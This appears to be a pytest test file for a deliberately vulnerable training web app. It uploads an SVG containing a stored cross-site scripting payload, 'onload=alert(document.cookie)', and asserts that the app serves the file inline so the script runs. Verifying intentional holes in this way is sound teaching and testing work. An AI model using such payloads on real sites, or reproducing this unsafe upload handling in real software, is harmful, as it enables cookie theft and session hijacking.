import io


SVG_PAYLOAD = b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"></svg>'


def test_upload_attachment_page_renders(client):
    response = client.get("/a03/upload-attachment")
    assert response.status_code == 200


def test_upload_and_view_svg_executes_as_svg_document(client):
    data = {"attachment": (io.BytesIO(SVG_PAYLOAD), "poc.svg")}
    response = client.post("/a03/upload-attachment", data=data, content_type="multipart/form-data")
    assert response.status_code == 302

    view_response = client.get("/a03/attachments/poc.svg")
    assert view_response.status_code == 200
    assert view_response.headers["Content-Type"].startswith("image/svg+xml")
    assert "attachment" not in view_response.headers.get("Content-Disposition", "").lower()
    assert b'onload="alert(document.cookie)"' in view_response.data


def test_uploaded_attachment_listed_on_page(client):
    data = {"attachment": (io.BytesIO(SVG_PAYLOAD), "poc.svg")}
    client.post("/a03/upload-attachment", data=data, content_type="multipart/form-data")
    response = client.get("/a03/upload-attachment")
    assert response.status_code == 200
    assert b"poc.svg" in response.data
